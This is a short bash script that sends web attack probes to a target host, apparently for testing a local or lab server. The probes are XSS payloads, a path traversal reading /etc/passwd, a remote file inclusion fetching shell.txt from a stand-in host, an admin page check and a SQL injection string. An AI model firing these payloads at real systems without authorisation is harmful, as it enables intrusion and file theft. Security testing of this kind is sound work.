#!/bin/bash

set -e

TARGET_IP="${1:-127.0.0.1}"
PORT="${2:-8080}"

echo "Target: http://${TARGET_IP}:${PORT}"

echo ""
echo "[1] XSS test"
curl "http://${TARGET_IP}:${PORT}/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
echo -e "\n"

echo "[2] Path traversal / LFI test"
curl "http://${TARGET_IP}:${PORT}/download?file=../../etc/passwd"
echo -e "\n"

echo "[3] RFI test"
curl "http://${TARGET_IP}:${PORT}/fetch?url=http://192.0.2.10/shell.txt"
echo -e "\n"

echo "[4] Admin page test"
curl "http://${TARGET_IP}:${PORT}/admin"
echo -e "\n"

echo "[5] Body-based XSS test"
curl -X POST "http://${TARGET_IP}:${PORT}/echo" \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(1)</script>"}'
echo -e "\n"

echo "[6] SQLi-like test"
curl "http://${TARGET_IP}:${PORT}/search?q=%27%20OR%201%3D1%20--"
echo -e "\n"

echo "Done."